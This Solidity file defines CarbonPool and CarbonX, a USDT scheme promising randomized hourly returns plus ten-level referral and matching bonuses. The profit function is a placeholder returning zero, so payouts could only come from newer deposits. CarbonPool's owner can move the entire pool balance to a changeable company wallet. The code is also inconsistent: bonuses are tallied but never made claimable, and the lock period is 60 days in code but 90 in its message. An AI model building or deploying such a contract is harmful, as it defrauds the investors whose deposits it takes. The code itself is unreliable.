// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract CarbonPool is ReentrancyGuard, Ownable {
    using SafeMath for uint256;

    IERC20 public token;
    address private companyWallet;
    uint256 public poolBalance;
    uint256 public lastDistributionTime; // Track the last distribution time

    event Deposited(uint256 amount);
    event CompanyWalletUpdated(address newWallet);
    event ProfitDistributed(uint256 amount);

    constructor(address _tokenAddress, address _companyWallet) {
        token = IERC20(_tokenAddress);
        companyWallet = _companyWallet;
    }

    function deposit(uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        poolBalance = poolBalance.add(amount);
        emit Deposited(amount);
    }

    function safeExit() external onlyOwner {
        require(token.transfer(companyWallet, poolBalance), "Transfer failed");
        poolBalance = 0;
    }

    function setCompanyWallet(address wallet) external onlyOwner {
        companyWallet = wallet;
        emit CompanyWalletUpdated(wallet);
    }

    // Function to distribute profit and update the last distribution time
    function distributeProfit(uint256 amount) external onlyOwner {
        uint256 FOUR_HOURS = 4 * 3600;
        require(amount <= poolBalance, "Insufficient balance for profit distribution");
        require(block.timestamp >= lastDistributionTime + FOUR_HOURS, "4 hours not elapsed since the last distribution");

        require(token.transfer(companyWallet, amount), "Profit distribution transfer failed");
        poolBalance = poolBalance.sub(amount);
        lastDistributionTime = block.timestamp;
        emit ProfitDistributed(amount);
    }

    // Add any other functions or modifiers as needed
}

contract CarbonX is ReentrancyGuard, Ownable {
    using SafeMath for uint256;

    modifier onlyInvestor() {
        require(addressToUserID[msg.sender] != 0, "You have no investment");
        _;
    }

    IERC20 public token;
    CarbonPool private pool;
    address private companyWallet;

    uint256 public constant DAY = 86400;
    uint256 public constant FOUR_HOURS = 4 * 3600;
    uint256 public constant HOUR = 3600;
    uint256 public constant ROI_MIN = 2;
    uint256 public constant ROI_MAX = 5;

    struct UserData {
        uint256 investmentTimestamp;
        uint256 sponsor;
        uint256 lastClaimTime;
        uint256 investedAmount;
        uint256 directSponsorsCount;
        uint256 goldInDownline;
        uint256 diamondInDownline;
        uint256 userROIReceived;
        uint256 userTotalDeposited;
        uint256 userTotalClaimed;
        uint256 userDirectBonusReceived;
        uint256 userMatchingBonusReceived;
        uint256 unclaimedBonuses;
        uint256[] downlines;
    }

    uint256 public lastUserID = 0;
    mapping(address => uint256) public addressToUserID;
    mapping(uint256 => UserData) public userData;
    mapping(uint256 => address) public userIDToAddress;
    mapping(uint256 => uint256[]) public downlines;

    event Invested(uint256 userId, uint256 amount);
    event BonusClaimed(uint256 userId, uint256 amount);
    event BonusAdded(uint256 userId, uint256 amount);

    constructor(address _poolAddress, address _tokenAddress, address _companyWallet) {
        pool = CarbonPool(_poolAddress);
        token = IERC20(_tokenAddress);
        companyWallet = _companyWallet;
    }

    function invest(uint256 sponsorID, uint256 amount) external nonReentrant {
        require(amount >= 100 ether, "Minimum 100 USDT required");
        require(token.transferFrom(msg.sender, address(this), amount), "Transfer failed");

        uint256 userID = registerOrGetUser(sponsorID);

        // Distribute sponsor and matching bonuses
        distributeSponsorAndMatchingBonuses(userID, amount);

        // Update user details
        updateUserDetails(userID, amount);
    }

    function registerOrGetUser(uint256 sponsorID) internal returns (uint256) {
        uint256 userID = addressToUserID[msg.sender];

        if (userID == 0) {
            userID = registerNewUser(sponsorID);
        }

        return userID;
    }

    function registerNewUser(uint256 sponsorID) internal returns (uint256) {
        lastUserID++;
        uint256 userID = lastUserID;

        addressToUserID[msg.sender] = userID;
        userIDToAddress[userID] = msg.sender;

        if (sponsorID == 0) {
            require(userID == 1, "Only the first user can have a sponsorID of 0");
            sponsorID = userID;
        } else {
            userData[sponsorID].directSponsorsCount++;
        }

        UserData storage newUser = userData[userID];
        newUser.sponsor = sponsorID;
        downlines[sponsorID].push(userID);

        return userID;
    }

    function updateUserDetails(uint256 userID, uint256 amount) internal {
        UserData storage user = userData[userID];
        user.lastClaimTime = block.timestamp;
        user.investedAmount = user.investedAmount.add(amount);
        user.userTotalDeposited = user.userTotalDeposited.add(amount);
        user.investmentTimestamp = block.timestamp;

        emit Invested(userID, amount);
    }

    function calculateROI(uint256 userID) public view returns (uint256) {
        uint256 hoursSinceLastClaim = (block.timestamp.sub(userData[userID].lastClaimTime)).div(HOUR);
        uint256 randomness = ROI_MIN + (uint256(keccak256(abi.encodePacked(block.timestamp, userID))) % (ROI_MAX - ROI_MIN + 1));
        uint256 hourlyROI = userData[userID].investedAmount.mul(randomness).div(200000); // considering percentages as mentioned
        return hourlyROI.mul(hoursSinceLastClaim);
    }

    function claimROI() external nonReentrant onlyInvestor {
        uint256 userID = addressToUserID[msg.sender];
        uint256 roi = calculateROI(userID);
        
        // Check if the calculated ROI is at least 10 USDT
        require(roi >= 10 * 10**18, "Minimum ROI of 10 USDT required");

        token.transfer(msg.sender, roi);
        userData[userID].userROIReceived = userData[userID].userROIReceived.add(roi);
        userData[userID].userTotalClaimed = userData[userID].userTotalClaimed.add(roi);
        userData[userID].lastClaimTime = block.timestamp;
    }

    function claimBonus() external nonReentrant onlyInvestor {
        uint256 userID = addressToUserID[msg.sender];
        uint256 bonus = userData[userID].unclaimedBonuses;
        require(bonus > 0, "No bonuses to claim");

        // Transfer bonus and reset bonus counter
        token.transfer(msg.sender, bonus);
        userData[userID].unclaimedBonuses = 0;
        emit BonusClaimed(userID, bonus);
    }

    function claimInvestedAmount() external nonReentrant onlyInvestor {
        uint256 userID = addressToUserID[msg.sender];
        require(userData[userID].investedAmount > 0, "No amount to claim");
        require(block.timestamp > userData[userID].investmentTimestamp.add(60 * DAY), "Invested amount locked for 90 days");
        
        uint256 investment = userData[userID].investedAmount;
        require(token.transfer(msg.sender, investment), "Transfer failed");
        
        userData[userID].userTotalDeposited = userData[userID].userTotalDeposited.sub(investment);
        userData[userID].userTotalClaimed = userData[userID].userTotalClaimed.add(investment);
        userData[userID].investedAmount = 0;
        userData[userID].lastClaimTime = block.timestamp;
    }

    function distributeSponsorAndMatchingBonuses(uint256 userID, uint256 amount) internal {
        uint256 sponsorID = userData[userID].sponsor;
        uint256 directBonus = amount.div(10);  // 10% direct bonus
        userData[sponsorID].userDirectBonusReceived = userData[sponsorID].userDirectBonusReceived.add(directBonus);

        uint256 remainingMatchingBonus = amount;  // Use the full amount for matching bonus calculation

        for (uint256 i = 0; i < 10 && remainingMatchingBonus > 0; i++) {
            sponsorID = userData[sponsorID].sponsor;
            if (sponsorID == 0) break;

            uint256 matchingBonusPercentage = getMatchingBonusPercentage(i + 1);  // 7%, 5%, 3%, 2%, 1% for levels 1 to 10
            uint256 matchingBonus = amount.mul(matchingBonusPercentage).div(100);
            userData[sponsorID].userMatchingBonusReceived = userData[sponsorID].userMatchingBonusReceived.add(matchingBonus);

            remainingMatchingBonus = remainingMatchingBonus.sub(matchingBonus);
        }

        emit BonusAdded(userID, directBonus);
    }

    function getMatchingBonusPercentage(uint256 level) internal pure returns (uint256) {
        if (level <= 5) {
            if (level == 1) return 7;
            if (level == 2) return 5;
            if (level == 3) return 3;
            if (level == 4) return 2;
            if (level == 5) return 1;
            if (level == 6) return 1;
            if (level == 7) return 1;
            if (level == 8) return 1;
            if (level == 9) return 1;
            if (level == 10) return 1;
        }
        return 0; // No matching bonus beyond level 10
    }

    function updateProfitDistribution() external onlyOwner {
        // Distribute profit to all investors every 4 hours
        require(block.timestamp >= pool.lastDistributionTime() + FOUR_HOURS, "4 hours not elapsed since the last distribution");

        uint256 totalProfit = calculateTotalProfit();
        require(totalProfit > 0, "No profit available to distribute");

        pool.distributeProfit(totalProfit);
    }

    function calculateTotalProfit() internal pure returns (uint256) {
        // Calculate total profit here (e.g., from external sources or other contracts)
        // This is just a placeholder
        return 0;
    }

    function getDirectSponsorsCount(uint256 userID) external view returns (uint256) {
        return userData[userID].directSponsorsCount;
    }

    function getUserTotalHierarchy(uint256 userID) external view returns (uint256) {
        return getHierarchyCount(userID);
    }

    function getHierarchyCount(uint256 userID) internal view returns (uint256) {
        uint256 count = 0;
        for (uint256 i = 0; i < downlines[userID].length; i++) {
            count = count.add(1).add(getHierarchyCount(downlines[userID][i]));
        }
        return count;
    }

    function getAddressByUserID(uint256 userID) external view returns (address) {
        return userIDToAddress[userID];
    }

    function getUserIDByAddress(address userAddress) external view returns (uint256) {
        return addressToUserID[userAddress];
    }

    function generateRandomness(uint256 timestamp, uint256 userID) internal pure returns (uint256) {
        uint256 randomnessRange = ROI_MAX.sub(ROI_MIN).add(1); // Determines the range
        uint256 randomValue = uint256(keccak256(abi.encodePacked(timestamp, userID))) % randomnessRange;
        return ROI_MIN.add(randomValue);
    }

    function getCurrentHourROIPercentage(uint256 userID) public view returns (uint256) {
        uint256 randomness = generateRandomness(block.timestamp, userID);
        // Multiplying with 10000 (100 for percentage and 100 for two decimal places)
        return randomness.mul(10000).div(100); 
    }

    function getNextHourROIPercentage(uint256 userID) public view returns (uint256) {
        uint256 nextHourTimestamp = block.timestamp + 1 hours;
        uint256 randomness = generateRandomness(nextHourTimestamp, userID);
        return randomness.mul(10000).div(100); 
    }

    function getAvailableBonus(uint256 userID) public view returns (uint256) {
        return userData[userID].unclaimedBonuses;
    }
}

